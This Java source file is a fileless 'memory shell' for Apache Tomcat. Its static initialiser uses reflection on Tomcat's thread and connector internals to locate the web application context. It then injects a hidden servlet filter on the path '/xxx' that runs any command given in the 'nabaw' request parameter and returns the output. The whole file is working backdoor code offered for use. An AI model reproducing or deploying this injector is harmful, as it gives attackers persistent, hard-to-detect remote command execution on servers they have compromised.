package cn.timerzz.filter;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;
import org.apache.tomcat.util.buf.MessageBytes;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

@SuppressWarnings("unchecked")
public class Tomcat6789filter extends HttpServlet implements Filter{
    public static String uri;
    public static String serverName;
    public static StandardContext standardContext;

    public static String name = "xxxFiler";
    public static String injectURL = "/xxx";
    public static String shellParameter = "nabaw";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // new Tomcat7filter();
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }
//    @Override
//    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
//
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException { }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter(shellParameter) != null) {
            Process result = Runtime.getRuntime().exec(req.getParameter(shellParameter));
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(result.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
    @Override
    public void destroy() {}

    public static void getStandardContext() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        // Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        boolean flag = false;
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                }catch (Exception e){}
                if (jioEndPoint == null){
                    try{
                        jioEndPoint = getField(target, "endpoint");
                    }catch (Exception e){ return; }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                }catch (Exception e){}
                if (engine == null){
                    engine = (StandardEngine) getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                StandardHost standardHost = null;
                standardHost = (StandardHost) children.get(serverName);
                if(standardHost == null){
                    standardHost = (StandardHost) children.get("localhost");
                }
                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();

                    if (!(uri.startsWith(contextKey))){continue;}

                    StandardContext standardContext1 = (StandardContext) children.get(contextKey);
                    standardContext = standardContext1;
                    // System.out.println(standardContext);
                    flag = true;
                    if (flag) break;
                }
            }
            if(flag) break;
        }
    }

    static{
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        boolean f = false;
        for (Thread thread : threads) {
            if (thread == null) { continue; }
            if (thread.getName().contains("exec")) { continue; }
            Object target = getField(thread, "target");
            if (!(target instanceof Runnable)) { continue; }
            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) { continue; }
            if (object == null) { continue; }
            ArrayList processors = (ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();
                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)){continue;}
                MessageBytes serverNameMB = (MessageBytes) getField(req, "serverNameMB");
                serverName = (String) getField(serverNameMB, "strValue");
                if (serverName == null){ serverName = serverNameMB.toString();}
                MessageBytes uriMB = (MessageBytes) getField(req, "uriMB");
                uri = (String) getField(uriMB, "strValue");
                if (uri == null){ uri = uriMB.toString(); }
                getStandardContext();
                f = true;
                if(f) break;
            }
            if(f) break;
        }
        // inject
        try {
            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            if (filterConfigs.get(name) == null) {
                Tomcat6789filter filter1 = new Tomcat6789filter();

                Class DefClass = null;
                try {
                    DefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }catch (Throwable t){}
                if (DefClass==null){
                    try{
                        DefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    }catch (Throwable t){}
                }

                Constructor defClassDeclaredConstructor = DefClass.getDeclaredConstructor();
                Object filterDef = defClassDeclaredConstructor.newInstance();

                // FilterDef filterDef = new FilterDef();
                Field filterName = DefClass.getDeclaredField("filterName");
                filterName.setAccessible(true);
                filterName.set(filterDef, name);
                // filterDef.setFilterName(name);

                // filterDef.setFilterClass(filter1.getClass().getName());
                Field filterClass = DefClass.getDeclaredField("filterClass");
                filterClass.setAccessible(true);
                filterClass.set(filterDef, filter1.getClass().getName());

                // filterDef.setFilter(filter1);

                Field filter = DefClass.getDeclaredField("filter");
                filter.setAccessible(true);
                filter.set(filterDef, filter1);

                // standardContext.addFilterDef(filterDef);
                Method addFilterDef = standardContext.getClass().getDeclaredMethod("addFilterDef", DefClass);
                addFilterDef.invoke(standardContext, filterDef);

                // FilterMap filterMap = new FilterMap();
                Class MapClass = null;
                try {
                    MapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }catch (Throwable t){}
                if (MapClass == null){
                    try{
                        MapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    }catch (Throwable t){}
                }

                Constructor declaredConstructor = MapClass.getDeclaredConstructor();
                Object filterMap = declaredConstructor.newInstance();
                Method addURLPattern = MapClass.getDeclaredMethod("addURLPattern", String.class);
                addURLPattern.invoke(filterMap, injectURL);
//                filterMap.addURLPattern(injectURL);
//                filterMap.setFilterName(name);
                Field filterName1 = MapClass.getDeclaredField("filterName");
                filterName1.setAccessible(true);
                filterName1.set(filterMap, name);
                // filterMap.setDispatcher(DispatcherType.REQUEST.name());
                Method setDispatcher = MapClass.getDeclaredMethod("setDispatcher", String.class);
                setDispatcher.invoke(filterMap, DispatcherType.REQUEST.name());
                Method addBefore = standardContext.getClass().getDeclaredMethod("addFilterMapBefore", MapClass);
                addBefore.invoke(standardContext, filterMap);

                // standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, DefClass);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(name, filterConfig);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException e){}
            catch (IllegalAccessException e){}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

}